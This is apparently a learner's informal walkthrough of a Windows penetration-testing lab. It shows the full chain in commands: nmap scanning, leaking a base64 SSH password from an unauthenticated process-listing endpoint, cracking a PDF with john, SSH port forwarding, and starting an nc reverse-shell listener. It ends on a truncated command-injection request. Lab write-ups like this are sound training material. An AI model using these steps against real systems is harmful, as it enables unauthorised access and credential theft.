To exploit this lab, you'll leverage credential disclosure on a web application endpoint to gain an initial foothold. This lab helps you understand how to exploit credential disclosures, crack passwords, and bypass firewall protections for privilege escalation.

Summary

This lab demonstrates exploiting a credential disclosure in a web application to gain an initial foothold via SSH. Learners will extract credentials from a password-protected PDF to uncover a hidden administrative service, then bypass firewall protections using SSH port forwarding. The lab concludes with executing commands as SYSTEM and deploying a reverse shell, showcasing advanced enumeration, port forwarding, and privilege escalation techniques.

Learning Objectives

After completion of this lab, learners will be able to:

Enumerate services to uncover potential web application endpoints and examine their functionality.
Exploit a credential disclosure to gain initial access via FTP and SSH.
Extract information from a protected PDF and discover hidden services.
Bypass firewall restrictions using SSH port forwarding to access the hidden service.
Execute a reverse shell payload to gain SYSTEM-level access on the target machine."

alright. lets get started.

    nmap -sS -sV 192.168.59.99

```
???(kali?kali)-[~]
??$ nmap -sS -sV 192.168.59.99
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 18:01 +0000
Nmap scan report for 192.168.59.99
Host is up (0.00048s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.60 beta
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8089/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.99 seconds
```

http://192.168.59.99:8089 - devops
http://192.168.59.99:33333 - idk



```
HTTP/1.1 200 OK
Content-Length: 468
Server: Microsoft-HTTPAPI/2.0
Date: Tue, 17 Mar 2026 18:10:57 GMT

<h1>DevOps Dashboard</h1>
<hr>
<form action='http://169.254.85.99:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.85.99:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.85.99:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>
```


http://192.168.59.99:33333/list-current-deployments
http://192.168.59.99:33333/list-running-procs
http://192.168.59.99:33333/list-active-nodes

    curl -X POST http://192.168.59.99:33333/list-current-deployments -d "{}"
nope.

    curl -X POST http://192.168.59.99:33333/list-active-nodes -d "{}"
nothing.

    curl -X POST http://192.168.59.99:33333/list-running-procs -d "{}"
    name        : cmd.exe
    commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
                  "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
got it.

    ssh ariah@192.168.59.99
    Tm93aXNlU2xvb3BUaGVvcnkxMzkK

nope. must be ftp.

    ftp ariah@192.168.59.99
    Tm93aXNlU2xvb3BUaGVvcnkxMzkK

nope.

OH. it's base64. thanks claude.

NowiseSloopTheory139

    ssh ariah@192.168.59.99
    NowiseSloopTheory139
    powershell
    cat C:\Users\ariah\Desktop\local.txt
    # bam, user flag pwned.

now...what's next?

    ls C:\Users\ariah\Documents\

well. let's try FTP.


    ftp ariah@192.168.59.99
    NowiseSloopTheory139
    passive
    get Infrastructure.pdf

now. how do we crack it?

    pdf2john Infrastructure.pdf > Infrastructure.hash
    sudo gunzip /usr/share/wordlists/rockyou.txt.gz
    john Infrastructure.hash --wordlist=/usr/share/wordlists/rockyou.txt
    ariah4168

nice, got it.

    sudo apt install okular

    Infrastructure Notes
    Temporary Command endpoint: http://nickel/?
    Backup system: http://nickel-backup/backup
    NAS: http://corp-nas/files
    
    
great. now to punch through port 80.

    ssh -L 8082:nickel:80 ariah@192.168.59.99
    NowiseSloopTheory139


and now to start a rev shell listener on our attacker.

    nc -nvlp 4444

and to trigger a connection to it.

    curl localhost:8082/?command=sleep&203
